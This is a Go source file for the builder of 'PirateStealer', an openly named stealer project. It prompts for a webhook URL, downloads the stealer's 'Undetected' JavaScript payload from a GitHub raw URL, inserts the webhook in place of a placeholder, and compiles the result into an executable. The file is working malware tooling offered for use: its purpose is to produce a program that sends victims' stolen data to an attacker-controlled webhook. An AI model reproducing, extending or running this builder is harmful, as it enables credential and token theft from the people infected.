package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/bytixo/PirateStealer/Builder/logger"
)

func main() {
	var webhook string
	logger.Info("Enter Webhook URL:")
	fmt.Scanln(&webhook)
	build(webhook)
}

func build(webhook string) {
	logger.Info("Starting to compile")
	// Check for node
	_, err := exec.Command("node", "-v").Output()
	if err != nil {
		logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	logger.Info("Installing deps")
	// Install dependencies
	_, err = exec.Command("npm", "install").Output()
	if err != nil {
		logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	logger.Info("Installing pkg")
	// Check pkg
	_, err = exec.Command("pkg").Output() // idk why it dont work cba
	if err != nil {
		logger.Fatal("pkg not installed, installing ...", err)
		_, err = exec.Command("install-pkg.bat").Output()
		if err != nil {
			logger.Fatal(`Error install pkg, "npm install -g pkg", run this command in cmd please. Will exit in 5 seconds`, err)
			time.Sleep(5 * time.Second)
			os.Exit(1)
		}
	}
	logger.Info("getting code")
	req, err := http.NewRequest("GET", "https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index.js", nil)
	if err != nil {
		logger.Fatal(err)
	}

	httpClient := http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		logger.Fatal(err)
	}
	defer resp.Body.Close()
	r, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logger.Error(err)
	}
	//replace webhook

	c := strings.Replace(string(r), "da_webhook", webhook, -1)

	err = ioutil.WriteFile("index.js", []byte(c), 0666)
	if err != nil {
		logger.Fatal("Error writing to file", err)
	}
	time.Sleep(time.Second)

	// Compile it
	_, err = exec.Command("compile.bat").Output()
	if err != nil {
		logger.Fatal("Error while compiling", err)
		time.Sleep(5 * time.Second)
		os.Exit(1)
	}
	logger.Info("Program have been compiled with your webhook")
	err = os.Remove("index.js")
	if err != nil {
		logger.Fatal(err)
	}
}
